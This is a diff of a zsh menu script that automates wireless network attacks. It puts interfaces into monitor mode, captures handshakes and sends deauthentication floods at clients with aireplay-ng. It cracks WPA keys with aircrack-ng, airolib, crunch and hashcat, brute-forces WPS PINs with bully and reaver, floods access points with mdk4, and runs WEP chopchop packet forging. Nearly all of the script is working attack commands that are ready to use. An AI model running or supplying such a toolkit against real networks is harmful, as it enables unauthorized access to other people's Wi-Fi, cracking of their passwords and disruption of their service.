@@ -39,7 +39,7 @@ function box () {
   w=0; for a in $@[OPTIND,-1]; do ((${(c)#a} > w)) && w=${(c)#a}; done; 
   ((${+h:+1} && $#h > w)) && w=$#h && ((w+=2)); ((w+=2));
 
-  ((w + 2 > COLUMNS)) && {
+  if ((w + 2 > COLUMNS)); then
     # FIXME; IF HEADER MULTI ROW OR LONGER THAN COLUMNS ... ELSE
     ((${+h:+1})) && printf '%b%s%s%b%s%b%s%s\n' $B $tl ${(pr.(COLUMNS-2-$#h)/2..$th.)th} $r$H $h $r$B ${(pr.(COLUMNS-2-$#h)/2+$#h+COLUMNS-2-($#h+COLUMNS-2)/2*2..$th.)th} $tr || printf '%b%s%s%s\n' $B $tl ${(pr.COLUMNS-3..$th.)th} $tr;
     for a in $@[OPTIND,-1]; do 
@@ -48,11 +48,11 @@ function box () {
       done;
     done;
     printf '%s%s%s%b\n' $bl ${(pr.COLUMNS-2..$bh.)bh} $br $r;
-  } || {
+  else;
     ((${+h:+1})) && printf '%b%s%s%b%s%b%s%s\n' $B $tl ${(pr.(w-$#h)/2..$th.)th} $r$H $h $r$B ${(pr.(w-$#h)/2+$#h+w-($#h+w)/2*2..$th.)th} $tr || printf '%b%s%s%s\n' $B $tl ${(pr.w-1..$th.)th} $tr;
     for a in $@[OPTIND,-1]; do printf '%s %b%s%b %s\n' $lv $r$T ${(r.w-2.. .)a} $r$B $rv; done;
     printf '%s%s%s%b\n' $bl ${(pr.w..$bh.)bh} $br $r;
-  };
+  fi;
 }
 
 function menu () {
@@ -73,148 +73,160 @@ function menu () {
 }
 
 function select-cap () {
-  caps=(${(f)"$(printf '%s\n' ${wifiDir}/*.cap)"}) &>/dev/null;
-  caps+=(${(f)"$(printf '%s\n' ${t}/*.cap)"}) &>/dev/null;
-  ((${#caps} == 0)) && read -sk1 '?No .cap files found. ' && unset caps && return 1;
-  ((${#caps} > 1)) && {
-    cap="$(stat -c '%W %n' ${caps} | sort -r -k 1 | cut -f2- -d ' ' | fzy -l $LINES -p 'select cap file> ')";
-    [[ ! -f  ${cap} ]] && read -sk1 "?${cap}: File does not exist. " && unset cap && return 1;
-  } || { 
+  typeset caps;
+  caps=(*.cap(.om)) &>/dev/null;
+  if ((${#caps} == 0)); then;
+   read -sk1 "?${n}No .cap files found. "; return 1;  
+  elif ((${#caps} > 1)); then;
+    cap="$(fzy -l $LINES -p 'select cap file> ' <<< ${(F)caps})";
+    [[ -z ${cap} ]] && read -sk1 "?${n}${cap}: File does not exist. " && return 1;
+    [[ ! -f ${cap} ]] && read -sk1 "?${n}${cap}: File does not exist. " && unset cap && return 1;
+  else;
     cap=${caps[1]}; 
-  };
+  fi;
 }
 
 function switch-mode () {
   local a d;
-  [[ ! ${interface} =~ '^\S+mon\d*$' ]] && {
-    interface=$(airmon-ng start ${interface} | perl -ne 's/^\s*\(\w+ monitor mode vif enabled for \[\w+\]'${interface}' on \[\w+\](\w+)\)$/$1/ && print') && {
+  if [[ ! ${interface} =~ '^\S+mon\d*$' ]]; then;
+    if interface=$(airmon-ng start ${interface} | perl -ne 's/^\s*\(\w+ monitor mode vif enabled for \[\w+\]'${interface}' on \[\w+\](\w+)\)$/$1/ && print'); then;
       mode=monitor;
-    } || {
-      d=(${(f)"$(iw dev | pcre2grep -Mi -o1 -o2 'interface (\S+)[\s\S]+?type monitor')"}); 
-      for a in ${d}; do 
-        airmon-ng stop ${a} &>/dev/null; 
-      done; 
-      switch-mode || return 1; 
-    };
-  } || {
-    interface=$(airmon-ng stop ${interface} | perl -ne 's/^\s*\(\w+ station mode vif enabled on \[\w+\](\w+)\)$/$1/ && print') && {
+    else;
+      d=(${(f)"$(iw dev | pcre2grep -Mi -o1 -o2 'interface (\S+)[\s\S]+?type monitor')"});
+      for a in ${d}; do
+        airmon-ng stop ${a} &>/dev/null;
+      done;
+      switch-mode || return 1;
+    fi;
+  else;
+    if interface=$(airmon-ng stop ${interface} | perl -ne 's/^\s*\(\w+ station mode vif enabled on \[\w+\](\w+)\)$/$1/ && print'); then;
       mode=managed;
-    } || { 
-      return 1; 
-    };
-  };
+    else;
+      return 1;
+    fi;
+  fi;
 }
 
 function select-network () {
-  ((! ${+essid})) || [[ $(read -seq '?select another network? ') = y ]] && true || return 0;
-
+  ((${+essid})) && [[ $(read -seq 'Select another network? ') != y ]] && return 0;
   local l s d;
-  ls $(pwd)/dump* &>/dev/null && {
-    [[ $(read -seq '?Use pcre2grepvious dump? ') != y ]] && {
+  z=(${t}/*.kismet.csv) &>/dev/null;
+  if ((${#z} > 0)); then
+    if [[ $(read -seq '?Use previous dump? ') = y ]]; then
+      dump=${$(fzf --preview-window=90%:down:wrap --reverse --preview='tr ";" "!" < {} | column -t -s "!" -o " "' <<< ${(F)z})%.kismet.csv};
+      [[ -z ${dump} ]] || local a;
+    else;
       dump=$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8);
       [[ ${mode} != monitor ]] && switch-mode;
-    } || {
-      local a;
-      dump=$(fzy -l $LINES <<< ${(F)"$(ls -1 $(pwd)/dump* | cut -d - -f 1)"});
-    };
-  } || {
-      dump=$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8);
-      [[ ${mode} != monitor ]] && switch-mode;
-  };
-  ((${+a})) || airodump-ng -w ${dump} ${interface}; clear;
-  l=$(wc -l ${dump}-01.kismet.csv | awk '{print $1}');
-  s=$(awk 'BEGIN {FS=";"}; {printf "%-8s%-32s%-24s%-24s%-8s%-8s\n", $1, $3, $4, $8, $6, $22}' ${dump}-01.kismet.csv | tail -n +2 | sort -n -r -k 6 | fzy -l $LINES -p 'Network ESSID                           BSSID                   Encryption              Channel BestQuality> ' | awk '{print $1}') || return 1;
-  ((s += 1));
-  d=(${(s.;.)"$(head -n $s ${dump}-01.kismet.csv | tail -n 1)"});
+    fi;
+  else;
+    dump=$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8);
+    [[ ${mode} != monitor ]] && switch-mode;
+  fi;
+
+  if ! ((${+a})); then
+    airodump-ng -w ${dump} ${interface};
+    [[ ${dump} =~ '-\d+$' ]] || $dump+='-01';
+  fi; clear;
+  l=$(wc -l < ${dump}.kismet.csv);
+  s=$(awk 'BEGIN {FS=";"}; {printf "%-8s%-32s%-24s%-24s%-8s%-8s\n", $1, $3, $4, $8, $6, $22}' ${dump}.kismet.csv | tail -n +2 | sort -n -r -k 6 | fzy -l $LINES -p 'Network ESSID                           BSSID                   Encryption              Channel BestQuality> ' | awk '{print $1}'); 
+  [[ -z $s ]] && return 1;
+  ((s += 1));  
+  d=(${(s.;.)"$(head -n $s ${dump}.kismet.csv | tail -n 1)"});
   essid=${d[3]};
   bssid=${d[4]};
   channel=${d[5]};
   security=${d[7]};
   power=${d[19]};
-  clients=(${(f)"$(pcre2grep -io1 "^([a-f0-9:]{17}), .+, ${bssid}," ${dump}-01.csv)"});
+  clients=(${(f)"$(pcre2grep -io1 "^([a-f0-9:]{17}), .+, ${bssid}," ${dump}.csv)"});
 }
 
 function select-interface () {
   local d;
   d=(${(f)"$(iw dev | pcre2grep -Mi -o1 -o2 'interface (\S+)[\s\S]+?type( \w+)')"});
-  if (($#d == 0)); then
+  if (($#d == 0)); then;
     read -sk1 '?No wireless devices found. ' && return 2; 
-  elif (($#d > 1)); then
+  elif (($#d > 1)); then;
     local s=$(printf '%s\n' $d | fzy -l $LINES -p 'select interface> '); 
     interface=${s% *}; mode=${s#* };
-  else
+  else;
     interface=${d% *}; mode=${d#* }; 
   fi;
 }
 
 function aircrack-pmk-attack () {
-  select-network; ! ((${+cap})) && { select-cap || return 1; };
+  select-network || return 1;
+  if ! ((${+cap})); then select-cap || return 1; fi;
   local a c s sp p w wl q;
-  ! wl=(${(f)"$(printf '%s\n' ${wordlistDir}/**/*(.))"}) &>/dev/null && { 
-    read -sk1 '?Nothing found. '; return 1; 
-  } || {
-    wl=(${(f)"$(fzf -i -m --reverse --prompt 'select 1-2 wordlists> ' <<< ${(F)wl})"});
-    for w in ${wl}; do [[ ! -f ${w} ]] && read -sk1 "?${w}: Does not exist. " && return 1; done;
-  };
+  wl=(${wordlistDir}/**/*(.)) &>/dev/null;
+  ((${#wl} == 0)) && read -sk1 "?${n}${wordlistDir}: Nothing found. " && return 1;
+  wl=(${(f)"$(fzf -i -m --reverse --prompt 'select 1-2 wordlists> ' <<< ${(F)wl})"});
   for w in ${wl}; do
+    [[ ! -f ${w} ]] && read -sk1 "?${w}: Does not exist. " && return 1;
     clear;
     s=$(du -B 1 ${w} | pcre2grep -o '^(\d+)');
-    ((s > 20971520)) && {
+    if ((s > 20971520)); then;
       ((s /= 20971520));
       for q in {0..$((s-1))}; do gate $s $q < ${w} > x${q}${w}; done;
       # split -d -n ${s} ${w} x; 
       sp=(${(f)$(printf '%s\n' ./x*(.))});
       for s in ${sp}; do
         while true; do
-          (($(jobs | wc -l) < 32)) && {
-            { { airolib-ng ${s}-DB --import passwd ${s}; rm ${s}; airolib-ng ${s}-DB --import essid ${essid}; airolib-ng ${s}-DB --batch; exit; } &; }; break;
-          } || sleep 60;
+          if (($(jobs | wc -l) < 8)); then;
+            ( airolib-ng ${s}-DB --import passwd ${s}; rm ${s}; airolib-ng ${s}-DB --import essid ${essid}; airolib-ng ${s}-DB --batch; exit; ) &;
+            break;
+          else;
+            sleep 60;
+          fi;
         done;
       done;
-    } || {
+    else;
       airolib-ng ${wl}-DB --import passwd ${wl}; airolib-ng ${wl}-DB --import essid ${essid}; airolib-ng ${wl}-DB --batch;
-    };
+    fi;
     while (($(jobs | wc -l) > 0)); do sleep 60; done;
   done;
-  # c=${"$(printf '%s\n' ~/dcs/wifi/**/*.cap(.) /mnt/**/*.cap(.) | xargs -d '\n' stat -c '%W %n' | sort -r -k 1 | cut -f2- -d ' ' | fzy -l $LINES -p 'select cap file> ')"};
   for a in ./*-DB(.); do aircrack-ng -r ${a} ${cap}; done;
   # aircrack-ng -r "$(printf '%s,' ./*-DB(.))" ${cap};
 }
 
 function capture-packets () {
   [[ ${mode} != monitor ]] && switch-mode; clear;
-  menu -m 1b -t 2 '1 All traffic' '2 Specific channel' '3 Specific channel and BSSID' '* return' ' ';
-  case $(read -sek1 '?> ') in 
+  menu -m 1b -t 2 \
+    '1 All traffic' \
+    '2 Specific channel' \
+    '3 Specific channel and BSSID' \
+    '* return';
+  case $(read -sek1 "?${n}> ") in 
     (1) airodump-ng -w $(pwd)/dump$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8) ${interface};;
     (2) airodump-ng -c $(read -e '?[1--17]> ') -w $(pwd)/dump$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8) ${interface};;
-    (3) select-network; { airodump-ng -c ${channel} -d ${bssid} -w ${essid} ${interface}; } &;
-      ((${#clients} == 0)) && {
-        { aireplay-ng -0 64 -a ${bssid} ${interface}; exit; } &;
-      } || {
-        local client; for client in ${clients}; do 
-          { aireplay-ng -0 64 -a ${bssid} -c ${client} ${interface}; exit; } &; 
+    (3) select-network || return 1;
+      airodump-ng -c ${channel} -d ${bssid} -w ${essid} ${interface} &; sleep 1;
+      if ((${#clients} == 0)); then;
+        aireplay-ng -0 64 -a ${bssid} ${interface} &>/dev/null &;
+      else;
+        local client; for client in ${clients}; do;
+          aireplay-ng -0 64 -a ${bssid} -c ${client} ${interface} &>/dev/null &;
         done; 
-      };;
+      fi;;
     (*) return;;
   esac;
 }
 
 function aircrack-dict-attack () {
-  local wl s;
-  [[ $(read -seq '?resume dictionary attack? ') = y ]] && {
-    s+=(${(f)"$(printf '%s\n' ${t}/*.sesh(.bak)#(.oc))"}) &>/dev/null;
-    s+=(${(f)"$(printf '%s\n' ${wifiDir}/*.sesh(.bak)#(.oc))"}) &>/dev/null;
-    (($#s!=0)) && [[ -f "$(fzy -l $LINES <<< ${(F)s})" ]] && aircrack-ng -R ${s};
+  local wl sesh;
+  sesh=(${t}/*.sesh(.bak)#(.om)) &>/dev/null;
+  if ((${#sesh} > 0)) && [[ $(read -seq "?${n}Resume dictionary attack? ") = y ]]; then;
+    [[ -f "$(fzy -l $LINES <<< ${(F)sesh})" ]] && aircrack-ng -R ${sesh};
     return;
-  }; 
-  printf '\n';
-
-  select-network; select-cap;
-  wl=(${(f)"$(printf '%s\n' ${wordlistDir}/**/*(.))"}); ((${#wl} == 0)) && read -sk1 '?Nothing found. ' && return 1;
+  fi;
+  select-network || return 1; 
+  select-cap || return 1;
+  wl=(${wordlistDir}/**/*(.)) &>/dev/null;
+  ((${#wl} == 0)) && read -sk1 "?${n}${wordlistDir}: Nothing found. " && return 1;
   wl=(${(f)"$(fzf -i -m --reverse --prompt 'select wordlists> ' <<< ${(F)wl})"});
 
-  { sleep 30; while ps -C aircrack-ng &>/dev/null; do sleep $((60 * 10)); cp ${essid}.sesh ${essid}.sesh.bak; done; exit; } &;
-  aircrack-ng -N ${essid}.sesh -l ${essid}.key -w "$(printf '%s,' $wl)" -b ${bssid} ${cap};
+  { sleep 30; while ps -C aircrack-ng &>/dev/null; do sleep 300; cp ${essid}.sesh ${essid}.sesh.bak &>/dev/null; done; } &;
+  aircrack-ng -N ${essid}.sesh -l ${essid}.key -w ${(j.,.)wl} -b ${bssid} ${cap};
 }
 
 function state () {
@@ -254,7 +266,7 @@ function mdk4-attack () {
       'n select network' \
       'm switch interface mode' \
       '* return';
-    case $(read -sek1 '?> ') in
+    case $(read -sek1 "?${n}> ") in
       (1) mdk4 wlp3s0mon b -n ${essid} -c ${channel} -s 1024 -h;;
       (2) mdk4 wlp3s0mon a -a ${bssid} -m;;
       (3) mdk4 wlp3s0mon p -t ${bssid} -s 1024 -b nul -s 2048;;
@@ -271,12 +283,12 @@ function mdk4-attack () {
 }
 
 function aircrack-crunch-attack () {
-  select-network; select-cap;
+  select-network || return 1; select-cap || return 1;
   menu -m 1b -t 2 \
     '1  type in characters (in order of lower upper digit symbol) manually' \
     '2  use pcre2grepdefined character set' \
-    '*  return' ' ';
-  case $(read -sek1 '?> ') in
+    '*  return';
+  case $(read -sek1 "?${n}> ") in
     (1) crunch $(read -e '?min len> ') $(read -e '?max len> ') $(read -e '?charset> ') | aircrack-ng ${cap} -l ${essid}.key -b ${bssid} -w-;;
     (2) crunch $(read -e '?min len> ') $(read -e '?max len> ') -f ~/src/crunch/charset.lst $(perl -ne '/^[^v]+\s+=\s+\[.+\]$/ && print' < ~/src/crunch/charset.lst | fzy -p 'select charset> ' -l $LINES | awk '{print $1}') | aircrack-ng ${cap} -l ${essid}.key -b ${bssid} -w-;;
     (*) return;;
@@ -285,9 +297,11 @@ function aircrack-crunch-attack () {
 
 function bully-reaver-attack () {
   clear; local sesh;
-  sesh=${(f)$(printf '%s\n' /mnt/**/*.reaver.sesh(.oc))} &>/dev/null && [[ $(read -seq '?resume reaver session? ') = y ]] && {
-    sesh="$(fzy -l $LINES -p 'select sesh> ' <<< ${(F)sesh})"; [[ -f ${sesh} ]] && reaver -R ${sesh};
-  } || {
+  sesh=(${t}/*.reaver.sesh(.om)) &>/dev/null;
+  if ((${#sesh} > 0)) && [[ $(read -seq '?Resume reaver session? ') = y ]]; then
+    sesh="$(fzy -l $LINES -p 'select sesh> ' <<< ${(F)sesh})";
+    [[ -f ${sesh} ]] && [[ ! -z ${sesh} ]] && reaver -R ${sesh};
+  else;
     state 'BULLY/REAVER';
     menu -m 1b -t 2 \
       '1 bully pindb / custompin' \
@@ -298,8 +312,8 @@ function bully-reaver-attack () {
       '6 reaver bruteforce' \
       '7 reaver nullpin' \
       '8 select network' \
-      '* return' ' ';
-    case $(read -sek1 '?> ') in
+      '* return';
+    case $(read -sek1 "?${n}> ") in
       (1) bully ${interface} -b ${bssid} -c ${channel} -L -F -B -v -p;;
       (2) bully ${interface} -b ${bssid} -c ${channel} -d -v;;
       (3) bully ${interface} -b ${bssid} -c ${channel} -S -L -F -B -v;;
@@ -310,26 +324,32 @@ function bully-reaver-attack () {
       (8) select-network;;
       (*) return;
     esac;
-  };
+  fi;
 }
 
 function chopchop-attack() { # WEP ICV Attack
-  select-network; until [[ ${security} =~ tkip ]]; do read -sk1 '?Select a network with TKIP> '; select-network; done; (($? != 0)) && return 1;
+  select-network || return 1;
+  until [[ ${security} =~ tkip ]]; do 
+    read -sk1 "?${n}Select a network with TKIP> ";
+    select-network || return 1;
+  done; ((? != 0)) && return 1;
+  [[ ${mode} != managed ]] && switch-mode;
   airmon-ng start ${interface} ${channel};
-  ! local m=$(< /sys/class/net/${interface}/address) && read -sk1 "?${interface}: No MAC address found." && return 1;
+  ! local m=$(< /sys/class/net/${interface}/address) && read -sk1 "?${n}${interface}: No MAC address found. " && return 1;
 
   aireplay-ng -4 -b ${bssid} -h ${m} ${interface} | tee -a ${t}/${essid}-chopchopoutput.txt;
   packetforge-ng -0 -a ${bssid} -h ${m} -k 255.255.255.255 -l 255.255.255.255 -y ${t}/replay_dec-*.xor -w ${t}/${essid}-chopchop.cap;
-  [[ -f ${t}/${essid}-chopchop.cap ]] && aireplay-ng -2 -F -r ${t}/${essid}-chopchop.cap ${interface} || { read -sk1 '?No chopchop.cap file found.' && return 1; };
-  airmon-ng stop ${interface};
+  if [[ -f ${t}/${essid}-chopchop.cap ]]; then;
+    aireplay-ng -2 -F -r ${t}/${essid}-chopchop.cap ${interface};
+  else;
+    read -sk1 "?${n}No chopchop.cap file found. "; return 1;
+  fi;
 }
 
 function hashcat-attack () {
   local a c f h m o r t w z;
   o+=(--session="$(date +'%F-%T').hashcat" --hwmon-temp-about=96 --workload-profile=3 --opencl-device-types=1);
-
-  r=(${(f)"$(printf '%s\n' /mnt/**/*.hashcat(.oc))"}) &>/dev/null;
-  r+=(${(f)"$(printf '%s\n' ${wifiDir}/**/*.hashcat(.oc))"}) &>/dev/null; ((${#r} == 0)) && unset r;
+  r=(${t}/*.hashcat(.om)) &>/dev/null;
 
   while true; do clear;
     c="hashcat ${a:+--attack-mode=${a} }${t:+--hash-type=${t} }${o:+${o} }${h:+${h} }${w:+${w} }${m:+${m} }";
@@ -346,10 +366,10 @@ function hashcat-attack () {
       '5 select hash-type' \
       '6 options' \
       '7 run command' \
-      'q return' ' ';
-    case $(read -sek1 '?> ') in
+      'q return';
+    case $(read -sek1 "?${n}> ") in
       (0) 
-        ((${+r})) && hashcat --restore="$(fzy -l $LINES -i -p 'select session> ' <<< ${(F)r})" || read -sk1 '?No hashcat sessions found. ';;
+        [[ -n ${r[1]} ]] && hashcat --restore="$(fzy -l $LINES -i -p 'select session> ' <<< ${(F)r})" || read -sk1 '?No hashcat sessions found. ';;
       (1) 
         menu -m 1b -t 2 \
           '1 wordlist' \
@@ -357,8 +377,8 @@ function hashcat-attack () {
           '3 brute-force' \
           '4 hybrid wordlist + mask' \
           '5 hybrid mask + wordlist' \
-          '* return' ' ';
-        case $(read -sek1 '?select attack mode> ') in
+          '* return';
+        case $(read -sek1 "?${n}Select attack mode> ") in
           (1) a=0;;
           (2) a=1;;
           (3) a=3;;
@@ -366,40 +386,67 @@ function hashcat-attack () {
           (5) a=7;;
         esac;;
       (2) 
-        w=(${(f)"$(printf '%s\n' ${wordlistDir}/**/*(.))"});
-        while ((${#w} > 2)); do clear; printf '%s\n' ${w} ''; wl[$(read -e '?select wordlist entry # to remove> ')]=(); done && clear;
-        ((${#w} == 2)) && {
+        w=(${(f)"$(printf '%s\n' ${wordlistDir}/**/*(.D-))"});
+        while ((${#w} > 2)); do 
+          clear; printf '%s\n' ${w} ''; 
+          wl[$(read -e '?select wordlist entry # to remove> ')]=(); 
+        done && clear;
+        if ((${#w} == 2)); then;
           printf '%s\n' ${w} ''; 
           [[ $(read -seq '?reverse wordlist order for permutation attack? otherwise only first will be used> ') = y ]] && \
             w[3]=${w[2]} && w[2]=${w[1]} && w[1]=${w[3]} && w[3]=(); 
-        } || { 
+        else;
           ((${#w} == 1)) && [[ $(read -seq '?use same wordlist twice for permutation attack? ') = y ]] && w[2]=${w[1]}
-        };;
+        fi;;
       (3) 
-        menu -m 1b -t 2 '1 Select .cap to convert, or .hccapx' '2 Input hash file' '* return' ' ';
-        case $(read -sek1 '?> ') in
-          (1) f=(${(f)"$(printf '%s\n' ${wifiDir}/*.(hc)#cap(x)#(.) /mnt/**/*.(hc)#cap(x)#(.))"});
-            [[ -n ${f} ]] && f="$(printf '%s\n' ${f} | xargs -d '\n' stat -c '%W %n' | sort -r -k 1 | cut -f2- -d ' ' | fzy -l $LINES -p 'select file> ')";
-            [[ ${f} =~ '\.hccapx$' ]] && h=${f}|| { h="$(dirname ${f})/$(basename ${f} cap)hccapx"; cap2hccapx ${f} ${h} || unset h f; };;
+        menu -m 1b -t 2 \
+          '1 Select .cap to convert, or .hccapx' \
+          '2 Input hash file' \
+          '* return';
+        case $(read -sek1 "?${n}> ") in
+          (1) f=(${(f)"$(printf '%s\n' /mnt/tryhard/*.(hc)#cap(x)#(.om))"});
+            ((${#f} > 0)) && f="$(fzy -l $LINES -p 'select file> ' <<< ${(F)f})";
+            if [[ ${f} =~ '\.hccapx$' ]]; then;
+              h=${f};
+            else;
+              h="$(dirname ${f})/${f%.cap}.hccapx";
+              cap2hccapx ${f} ${h} || unset h f;
+            fi;;
           (2) read -sk1 '?FIXME...';;
         esac;;
       (4) 
-        printf '%s\n' 'Mask builtin charsets' '?l = abcdefghijklmnopqrstuvwxyz' '?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ' '?d = 0123456789' '?h = 0123456789abcdef' '?H = 0123456789ABCDEF' '?s = «space»!"#$%&()*+,-./:;<=>?@[\]^_`{|}~<apostrophe>' '?a = ?l?u?d?s' '?b = 0x00 - 0xff';
-        read 'm?Input mask> ';;
+        menu -m 4b -t 6b \
+          'Mask_builtin_charsets ' \
+          '?l abcdefghijklmnopqrstuvwxyz' \
+          '?u ABCDEFGHIJKLMNOPQRSTUVWXYZ' \
+          '?d 0123456789' \
+          '?h 0123456789abcdef' \
+          '?H 0123456789ABCDEF' \
+          '?s «space»!"#$%&()*+,-./:;<=>?@[\]^_`{|}~<apostrophe>' \
+          '?a ?l?u?d?s' \
+          '?b 0x00 - 0xff';
+        read -r "m?${n}Input mask> ";;
       (5) 
         t=$(printf '%s\n' ${(f)"$(hashcat --help | perl -ne 's/^\s+(\d+).+?(\S*WPA\S*).*/$1\t\t$2 / && print' | fzy -l $LINES -p 'select hash-type> ' | awk '{printf $1}')"});;
       (6) 
-        while true; do clear; printf '%s\n' "Current options: ${o}" '   1    add option' '   2    remove option' '   *    return';
+        while true; do 
+          clear; menu -m 1b -t 2 \
+            "Current_options: ${o}" \
+            '1 add option' \
+            '2 remove option' \
+            '* return';
           case $(read -sek1 '?> ') in
             (1) o+=(${(f)"$(read -e '?input option> ')"});;
             (2) o[$(read -e '?number of option to remove> ')]=() || true;;
           esac;
         done;;
       (7) 
-        ! ((${+a} || ${+t} || ${+h})) && read -sk1 '?Attack mode, hash type, or hccapx/hash file not specified!' || {
+        if ! ((${+a} || ${+t} || ${+h})); then;
+          read -sk1 '?Attack mode, hash type, or hccapx/hash file not specified!';
+        else;
           hashcat ${a:+--attack-mode=${a} }${t:+--hash-type=${t} }${o:+${o} }${h:+ ${h} }${w:+${w} }--speed-only;
-          [[ $(read -seq "?Run \033[32;1m${c}\033[0m)? ") = y ]] && hashcat ${a:+--attack-mode=${a} }${t:+--hash-type=${t} }${o:+${o} }${h:+ ${h} }${w:+${w} }; 
-        };;
+          [[ $(read -seq "?Run \033[32;1m${c}\033[0m)? ") = y ]] && hashcat ${a:+--attack-mode=${a} }${t:+--hash-type=${t} }${o:+${o} }${h:+ ${h} }${w:+${w} }${m:+${m} };
+        fi;;
       (*) break;;
     esac;
   done;
@@ -408,8 +455,11 @@ function hashcat-attack () {
 function wep-wash-attack () {
   local d;
   clear; [[ ${mode} != monitor ]] && switch-mode; 
-  d=(${(s. .)"$(wash -i ${interface} | fzf -i +m --reverse)"});
-  ((${bssid} != ${d[1]})) && { bssid=${d[1]}; essid=${d[7]}; channel=${d[2]}; power=${d[3]}; security="WPS ${d[4]}, ${d[5]} lock, ${d[6]}"; unset clients; };
+  d=(${(s. .)"$(wash -i ${interface} | fzy -l)"});
+  [[ -z ${d} ]] && return 1;
+  if ((${bssid} != ${d[1]})); then;
+    bssid=${d[1]}; essid=${d[7]}; channel=${d[2]}; power=${d[3]}; security="WPS ${d[4]}, ${d[5]} lock, ${d[6]}"; unset clients;
+  fi;
   bully -i ${interface} -b ${bssid} -c ${channel} -l 40;
 }
 
@@ -418,17 +468,18 @@ function quit () {
   (( $(jobs | wc -l) != 0 )) && kill -9 $(jobs -p | awk '{printf $3}');
   # rmdir /mnt/* &>/dev/null;
   unset essid bssid mode channel power interface security cap caps;
-  setopt nomatch;
+  # setopt nomatch;
 }
 
-
 function () {
+  setopt null_glob;
   wordlistDir=~/dcs/wordlists;
-  wifiDir=~/dcs/wifi;
   # t=$(mktemp -d /mnt/tryhard.XXXX); cd $t;
   t=/mnt/tryhard; mkdir -p ${t}; cd ${t};
+  n="
+  ";
   airmon-ng check kill;
-  select-interface;
+  select-interface || return 1;
   trap 'quit; clear;' QUIT;
   while true; do
     clear; state;
@@ -445,8 +496,8 @@ function () {
       'i select interface' \
       'm switch interface mode' \
       'n select network' \
-      'q quit' ' ';
-    case $(read -sek1 '?> ') in
+      'q quit';
+    case $(read -sek1 "?${n}> ") in
       (1) capture-packets;;
       (2) aircrack-pmk-attack;;
       (3) aircrack-dict-attack;;
@@ -458,7 +509,7 @@ function () {
       (9) chopchop-attack;;
       (m) switch-mode;;
       (n) select-network;;
-      (i) select-interface;;
+      (i) select-interface || return 1;;
       (q) break;;
     esac;
   done;
